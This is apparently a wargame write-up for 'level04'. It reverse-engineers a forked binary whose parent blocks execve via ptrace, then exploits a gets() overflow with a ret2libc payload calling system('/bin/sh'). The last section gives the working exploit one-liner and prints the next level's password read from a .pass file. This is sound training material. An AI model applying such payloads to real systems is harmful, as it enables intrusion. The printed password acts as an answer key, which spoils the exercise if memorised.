# RET2LIBC VULNERABILITY

## Reverse engineering

### Main part 

```asm
080486c8 <main>:
 80486c8:	55                   	push   ebp
 80486c9:	89 e5                	mov    ebp,esp
 80486cb:	57                   	push   edi
 80486cc:	53                   	push   ebx
 80486cd:	83 e4 f0             	and    esp,0xfffffff0
 80486d0:	81 ec b0 00 00 00    	sub    esp,0xb0
 80486d6:	e8 75 fe ff ff       	call   8048550 <fork@plt>
 80486db:	89 84 24 ac 00 00 00 	mov    DWORD PTR [esp+0xac],eax
```
- Stack grows 0xb0 bytes (176) for local variables, then fork is called to create a child process
- Return value is stored at [esp+0xac] (the child PID for the parent, 0 for the child).

```asm
 80486e2:	8d 5c 24 20          	lea    ebx,[esp+0x20]
 80486e6:	b8 00 00 00 00       	mov    eax,0x0
 80486eb:	ba 20 00 00 00       	mov    edx,0x20
 80486f0:	89 df                	mov    edi,ebx
 80486f2:	89 d1                	mov    ecx,edx
 80486f4:	f3 ab                	rep stos DWORD PTR es:[edi],eax
```
- Its clearing (like a memset) 0x20 bytes (32) starting from [esp+0x20] with zeros

```asm
 80486f6:	c7 84 24 a8 00 00 00 	mov    DWORD PTR [esp+0xa8],0x0
 80486fd:	00 00 00 00 
 8048701:	c7 44 24 1c 00 00 00 	mov    DWORD PTR [esp+0x1c],0x0
 8048708:	00 
 8048709:	83 bc 24 ac 00 00 00 	cmp    DWORD PTR [esp+0xac],0x0
 8048710:	00 
 8048711:	75 56                	jne    8048769 <main+0xa1>
```
- Initializes to zero the DWORD at [esp+0xa8] and [esp+0x1c]
- Comparing the fork return value to 0 : the child process executes part A, the parent process executes part B

### Part A (child process)

```asm
 8048713:	c7 44 24 04 01 00 00 	mov    DWORD PTR [esp+0x4],0x1
 804871a:	00 
 804871b:	c7 04 24 01 00 00 00 	mov    DWORD PTR [esp],0x1
 8048722:	e8 19 fe ff ff       	call   8048540 <prctl@plt>
```
- Prctl is called with 1 (PR_SET_PDEATHSIG) and 1 (SIGHUP) : it ensures the child process to receive SIGHUP signal if the parent dies. (parent dies = child get terminated)

```asm
 8048727:	c7 44 24 0c 00 00 00 	mov    DWORD PTR [esp+0xc],0x0
 804872e:	00 
 804872f:	c7 44 24 08 00 00 00 	mov    DWORD PTR [esp+0x8],0x0
 8048736:	00 
 8048737:	c7 44 24 04 00 00 00 	mov    DWORD PTR [esp+0x4],0x0
 804873e:	00 
 804873f:	c7 04 24 00 00 00 00 	mov    DWORD PTR [esp],0x0
 8048746:	e8 25 fe ff ff       	call   8048570 <ptrace@plt>
```
- Ptrace is called with 0 (PTRACE_TRACEME) : it allows the parent process to trace the child process.

```shell
(gdb) p (char*) 0x8048903
$1 = 0x8048903 "Give me some shellcode, k"
```
```asm
 804874b:	c7 04 24 03 89 04 08 	mov    DWORD PTR [esp],0x8048903
 8048752:	e8 a9 fd ff ff       	call   8048500 <puts@plt>
 8048757:	8d 44 24 20          	lea    eax,[esp+0x20]
 804875b:	89 04 24             	mov    DWORD PTR [esp],eax
 804875e:	e8 4d fd ff ff       	call   80484b0 <gets@plt>
 8048763:	e9 b2 00 00 00       	jmp    804881a <main+0x152>
 8048768:	90                   	nop
```
- The child process prints "Give me some shellcode, k" and waits for user input (shellcode) using gets().
- Gets is unsafe, it doesn't check the length of the input, a buffer overflow on the [esp+0x20] 32 bytes buffer is possible

### Part B (parent process)

```shell
(gdb) p (char*) 0x804891d
$2 = 0x804891d "child is exiting..."
```
```asm
 8048769:	8d 44 24 1c          	lea    eax,[esp+0x1c]
 804876d:	89 04 24             	mov    DWORD PTR [esp],eax
 8048770:	e8 7b fd ff ff       	call   80484f0 <wait@plt>
 8048775:	8b 44 24 1c          	mov    eax,DWORD PTR [esp+0x1c]
 8048779:	89 84 24 a0 00 00 00 	mov    DWORD PTR [esp+0xa0],eax
 8048780:	8b 84 24 a0 00 00 00 	mov    eax,DWORD PTR [esp+0xa0]
 8048787:	83 e0 7f             	and    eax,0x7f
 804878a:	85 c0                	test   eax,eax
 804878c:	74 1e                	je     80487ac <main+0xe4>
 ...
 80487ac:	c7 04 24 1d 89 04 08 	mov    DWORD PTR [esp],0x804891d
 80487b3:	e8 48 fd ff ff       	call   8048500 <puts@plt>
 80487b8:	eb 60                	jmp    804881a <main+0x152>
```
- The parent process waits the child process, since the child process set this parent as its tracer, the parent will be notified lots of times when things happen
- If (wait's return value) & 0x7f == 0, child process exited. So parent process prints a string then goes to program's end

```shell
(gdb) p (char*) 0x8048931
$3 = 0x8048931 "no exec() for you"
```
```asm
 80487ba:	c7 44 24 0c 00 00 00 	mov    DWORD PTR [esp+0xc],0x0
 80487c1:	00 
 80487c2:	c7 44 24 08 2c 00 00 	mov    DWORD PTR [esp+0x8],0x2c
 80487c9:	00 
 80487ca:	8b 84 24 ac 00 00 00 	mov    eax,DWORD PTR [esp+0xac]
 80487d1:	89 44 24 04          	mov    DWORD PTR [esp+0x4],eax
 80487d5:	c7 04 24 03 00 00 00 	mov    DWORD PTR [esp],0x3
 80487dc:	e8 8f fd ff ff       	call   8048570 <ptrace@plt>
 80487e1:	89 84 24 a8 00 00 00 	mov    DWORD PTR [esp+0xa8],eax
 80487e8:	83 bc 24 a8 00 00 00 	cmp    DWORD PTR [esp+0xa8],0xb
 80487ef:	0b 
 80487f0:	0f 85 72 ff ff ff    	jne    8048768 <main+0xa0>
 80487f6:	c7 04 24 31 89 04 08 	mov    DWORD PTR [esp],0x8048931
 80487fd:	e8 fe fc ff ff       	call   8048500 <puts@plt>
 8048802:	c7 44 24 04 09 00 00 	mov    DWORD PTR [esp+0x4],0x9
 8048809:	00 
 804880a:	8b 84 24 ac 00 00 00 	mov    eax,DWORD PTR [esp+0xac]
 8048811:	89 04 24             	mov    DWORD PTR [esp],eax
 8048814:	e8 07 fd ff ff       	call   8048520 <kill@plt>
```
- Call ptrace with 3 (PTRACE_PEEKUSER) to read the 0x2c (44 == ORIG_EAX) register of [esp+0xac] process (child)
- If the value is 11 (execve syscall), the parent process prints a string then kills the child process with SIGKILL (0x9)
- It prevents the child process to be vulnerable of ret2shellcode attack using a execve syscall

## Exploitation

Let's sum up the exploitation possibilities of this program :
- We can overflow the buffer which is already 32 bytes long, we still have to define the offset to the return address
- We can't use a ret2shellcode attack because the parent process will kill the child process if it detects a execve syscall

Final decision: lets define the return address offset and use a ret2libc attack to call system("/bin/sh") instead of execve("/bin/sh")

### Finding the return address offset

```shell
~$ python -c 'print "A"*(157)' > /tmp/exploit04
~$ gdb ./level04
(gdb) set follow-fork-mode child
(gdb) run < /tmp/exploit04 
Give me some shellcode, k

Program received signal SIGSEGV, Segmentation fault.
0xf7e40041 in ?? () from /lib32/libc.so.6
```
- The 41 at the end is the 'A' character, so the return address offset is 156 bytes

### Assemble the ret2libc attack

```shell
(gdb) b main
Breakpoint 1 at 0x80486cd
(gdb) run
Starting program: /home/users/level04/level04 

Breakpoint 1, 0x080486cd in main ()
(gdb) p system
$1 = {<text variable, no debug info>} 0xf7e6aed0 <system>
(gdb) info proc mappings
Mapped address spaces:
...
	0xf7e2c000 0xf7fcc000   0x1a0000        0x0 /lib32/libc-2.15.so
...
	
(gdb) find 0xf7e2c000, 0xf7fcc000, "/bin/sh"
0xf7f897ec
1 pattern found.
```
- The system() function is located at 0xf7e6aed0, the string "/bin/sh" is located at 0xf7f897ec

### Exploit 

```shell
~$ (python -c 'print "A"*(156) + "\xd0\xae\xe6\xf7" + "1234" + "\xec\x97\xf8\xf7"'; cat) | ./level04
Give me some shellcode, k
cat /home/users/level05/.pass
3v8QLcN5SAhPaZZfEasfmXdwyR59ktDEMAwHF3aN
```
- OFFSET (156 bytes) + SYSTEM() ADDRESS (0xf7e6aed0) + DUMMY RETURN ADDRESS (1234) + "/bin/sh" STRING ADDRESS (0xf7f897ec)